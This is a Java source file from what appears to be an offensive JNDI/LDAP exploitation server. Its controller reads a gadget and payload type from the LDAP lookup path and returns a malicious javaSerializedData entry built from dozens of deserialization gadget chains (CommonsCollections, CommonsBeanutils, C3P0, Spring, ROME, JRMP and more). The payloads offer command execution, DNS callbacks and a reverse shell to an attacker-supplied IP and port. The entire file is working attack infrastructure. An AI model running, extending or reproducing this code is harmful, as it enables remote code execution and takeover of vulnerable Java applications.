package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.*;
import com.nu1r.jndi.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/deserialization"})
public class SerializedDataController implements LdapController {
    private GadgetType  gadgetType;
    private PayloadType payloadType;
    private String[]    params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));
        Entry  e     = new Entry(base);
        byte[] bytes = null;
        switch (gadgetType) {
            case urldns:
                bytes = URLDNS.getBytes(params[0]);
                break;
            case commonsbeanutils1:
                bytes = (byte[]) CommonsBeanutils1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsBeanutils1.class.newInstance(), payloadType, params);
                break;
            case commonsbeanutils2:
                bytes = (byte[]) CommonsBeanutils2.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsBeanutils2.class.newInstance(), payloadType, params);
                break;
            case commonsbeanutils3:
                bytes = (byte[]) CommonsBeanutils3.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsBeanutils3.class.newInstance(), payloadType, params);
                break;
            case commonsbeanutils4:
                bytes = (byte[]) CommonsBeanutils4.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsBeanutils4.class.newInstance(), payloadType, params);
                break;
            case commonsbeanutils2nocc:
                bytes = (byte[]) CommonsBeanutils2NOCC.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsBeanutils2NOCC.class.newInstance(), payloadType, params);
                break;
            case commonsbeanutils3183:
                bytes = (byte[]) CommonsBeanutils3183.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsBeanutils3183.class.newInstance(), payloadType, params);
                break;
            case commonsbeanutils1183nocc:
                bytes = (byte[]) CommonsBeanutils1183NOCC.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsBeanutils1183NOCC.class.newInstance(), payloadType, params);
                break;
            case commonscollections1:
                bytes = (byte[]) CommonsCollections1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections1.class.newInstance(), payloadType, params);
                break;
            case commonscollections2:
                bytes = (byte[]) CommonsCollections2.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections2.class.newInstance(), payloadType, params);
                break;
            case commonscollections3:
                bytes = (byte[]) CommonsCollections3.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections3.class.newInstance(), payloadType, params);
                break;
            case commonscollections4:
                bytes = (byte[]) CommonsCollections4.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections4.class.newInstance(), payloadType, params);
                break;
            case commonscollections5:
                bytes = (byte[]) CommonsCollections5.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections5.class.newInstance(), payloadType, params);
                break;
            case commonscollections6:
                bytes = (byte[]) CommonsCollections6.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections6.class.newInstance(), payloadType, params);
                break;
            case commonscollections7:
                bytes = (byte[]) CommonsCollections7.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections7.class.newInstance(), payloadType, params);
                break;
            case commonscollections7lite_4:
                bytes = (byte[]) CommonsCollections7Lite.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections7Lite.class.newInstance(), payloadType, params);
                break;
            case commonscollections8:
                bytes = (byte[]) CommonsCollections8.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections8.class.newInstance(), payloadType, params);
                break;
            case commonscollections9:
                bytes = (byte[]) CommonsCollections9.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections9.class.newInstance(), payloadType, params);
                break;
            case commonscollections10:
                bytes = (byte[]) CommonsCollections10.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections10.class.newInstance(), payloadType, params);
                break;
            case commonscollectionsk1:
                bytes = (byte[]) CommonsCollectionsK1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollectionsK1.class.newInstance(), payloadType, params);
                break;
            case commonscollectionsk2:
                bytes = (byte[]) CommonsCollectionsK2.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollectionsK2.class.newInstance(), payloadType, params);
                break;
            case commonscollections6lite:
                bytes = (byte[]) CommonsCollections6Lite.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections6Lite.class.newInstance(), payloadType, params);
                break;
            case commonscollections6lite_4:
                bytes = (byte[]) CommonsCollections6Lite_4.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(CommonsCollections6Lite_4.class.newInstance(), payloadType, params);
                break;
            case jdk7u21:
                bytes = (byte[]) Jdk7u21.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Jdk7u21.class.newInstance(), payloadType, params);
                break;
            case jre8u20:
                bytes = (byte[]) Jre8u20.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Jre8u20.class.newInstance(), payloadType, params);
                break;
            case c3p0:
                bytes = (byte[]) C3P0.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(C3P0.class.newInstance(), payloadType, params);
                break;
            case c3p02:
                bytes = (byte[]) C3P02.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(C3P02.class.newInstance(), payloadType, params);
                break;
            case c3p03:
                bytes = (byte[]) C3P03.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(C3P03.class.newInstance(), payloadType, params);
                break;
            case c3p04:
                bytes = (byte[]) C3P04.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(C3P04.class.newInstance(), payloadType, params);
                break;
            case signedobject:
                bytes = (byte[]) SignedObject.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(SignedObject.class.newInstance(), payloadType, params);
                break;
            case aspectjweaver:
                bytes = (byte[]) AspectJWeaver.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(AspectJWeaver.class.newInstance(), payloadType, params);
                break;
            case beanshell1:
                bytes = (byte[]) BeanShell1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(BeanShell1.class.newInstance(), payloadType, params);
                break;
            case c3p092:
                bytes = (byte[]) C3P092.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(C3P092.class.newInstance(), payloadType, params);
                break;
            case click1:
                bytes = (byte[]) Click1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Click1.class.newInstance(), payloadType, params);
                break;
            case clojure:
                bytes = (byte[]) Clojure.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Clojure.class.newInstance(), payloadType, params);
                break;
            case jython1:
                bytes = (byte[]) Jython1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Jython1.class.newInstance(), payloadType, params);
                break;
            case json:
                bytes = (byte[]) JSON1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(JSON1.class.newInstance(), payloadType, params);
                break;
            case groovy1:
                bytes = (byte[]) Groovy1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Groovy1.class.newInstance(), payloadType, params);
                break;
            case hibernate1:
                bytes = (byte[]) Hibernate1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Hibernate1.class.newInstance(), payloadType, params);
                break;
            case hibernate2:
                bytes = (byte[]) Hibernate2.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Hibernate2.class.newInstance(), payloadType, params);
                break;
            case javassistweld1:
                bytes = (byte[]) JavassistWeld1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(JavassistWeld1.class.newInstance(), payloadType, params);
                break;
            case jbossinterceptors1:
                bytes = (byte[]) JBossInterceptors1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(JBossInterceptors1.class.newInstance(), payloadType, params);
                break;
            case jdk7u21variant:
                bytes = (byte[]) Jdk7u21variant.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Jdk7u21variant.class.newInstance(), payloadType, params);
                break;
            case jrmpclient:
                bytes = (byte[]) JRMPClient.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(JRMPClient.class.newInstance(), payloadType, params);
                break;
            case jrmpclient_activator:
                bytes = (byte[]) JRMPClient_Activator.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(JRMPClient_Activator.class.newInstance(), payloadType, params);
                break;
            case jrmpclient_obj:
                bytes = (byte[]) JRMPClient_Obj.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(JRMPClient_Obj.class.newInstance(), payloadType, params);
                break;
            case jrmplistener:
                bytes = (byte[]) JRMPListener.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(JRMPListener.class.newInstance(), payloadType, params);
                break;
            case mozillarhino1:
                bytes = (byte[]) MozillaRhino1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(MozillaRhino1.class.newInstance(), payloadType, params);
                break;
            case mozillarhino2:
                bytes = (byte[]) MozillaRhino2.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(MozillaRhino2.class.newInstance(), payloadType, params);
                break;
            case myfaces1:
                bytes = (byte[]) Myfaces1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Myfaces1.class.newInstance(), payloadType, params);
                break;
            case myfaces2:
                bytes = (byte[]) Myfaces2.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Myfaces2.class.newInstance(), payloadType, params);
                break;
            case renderedimage:
                bytes = (byte[]) RenderedImage.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(RenderedImage.class.newInstance(), payloadType, params);
                break;
            case rome:
                bytes = (byte[]) ROME.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(ROME.class.newInstance(), payloadType, params);
                break;
            case rome2:
                bytes = (byte[]) ROME2.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(ROME2.class.newInstance(), payloadType, params);
                break;
            case spring1:
                bytes = (byte[]) Spring1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Spring1.class.newInstance(), payloadType, params);
                break;
            case spring2:
                bytes = (byte[]) Spring2.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Spring2.class.newInstance(), payloadType, params);
                break;
            case spring3:
                bytes = (byte[]) Spring3.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Spring3.class.newInstance(), payloadType, params);
                break;
            case vaadin1:
                bytes = (byte[]) Vaadin1.class.getMethod("getBytes", PayloadType.class, String[].class).invoke(Vaadin1.class.newInstance(), payloadType, params);
                break;
        }

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", bytes);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try {
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try {
                gadgetType = GadgetType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                System.out.println("[+] GaddgetType >> " + gadgetType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            if (gadgetType == GadgetType.urldns) {
                String url = "http://" + base.substring(base.lastIndexOf("/") + 1);
                System.out.println("[+] URL >> " + url);
                params = new String[]{url};
                return;
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex < 0) thirdIndex = base.length();
            try {
                payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                System.out.println("[+] PayloadType >> " + payloadType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            switch (payloadType) {
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println("[+] URL >> " + url);
                    params = new String[]{url};
                    break;
                case nu1r:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                    params = new String[]{cmd};
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println("[+] IP >> " + results[0]);
                    System.out.println("[+] Port >> " + results[1]);
                    params = results;
                    break;
            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
